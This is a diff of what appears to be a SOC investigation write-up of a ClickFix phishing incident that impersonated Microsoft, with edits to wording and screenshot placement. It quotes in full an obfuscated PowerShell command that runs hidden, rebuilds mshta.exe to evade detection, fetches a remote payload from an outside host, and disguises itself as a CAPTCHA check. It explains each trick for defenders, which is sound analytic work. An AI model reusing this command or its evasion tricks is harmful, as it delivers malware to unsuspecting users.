@@ -43,9 +43,7 @@ The email impersonated Microsoft, used a fake countdown timer for urgency, and p
 
 Browser history confirms the visit to `windows-update.site` at 23:26:08.
 
-<img width="1547" height="714" alt="338-history" src="https://github.com/user-attachments/assets/46830a24-ec85-41dc-b824-423b69ec3920" />
-
-The ClickFix command placed in the user's clipboard was:
+At 23:26:19, the user ran the ClickFix command from the Run dialog:
 
 ```
 PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824''
@@ -54,6 +52,9 @@ PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoat
 - `-w 1` runs PowerShell with a hidden window.
 - `-replace ']'` strips the brackets, rebuilding `mshta.exe` so the name never appears in plain text (evades simple detection).
 - Everything after `#` is a comment. It's what the user sees at the end of the Run box, making the command look like a CAPTCHA check.
+
+<img width="767" height="258" alt="SOC-338-captcha" src="https://github.com/user-attachments/assets/57cfac3d-9687-49ff-a992-edefbeff8eb0" />
+
 
 <img width="1225" height="520" alt="338-terminal" src="https://github.com/user-attachments/assets/ef98cb5d-eaa3-4944-9ccf-207ef88a08dc" />
 
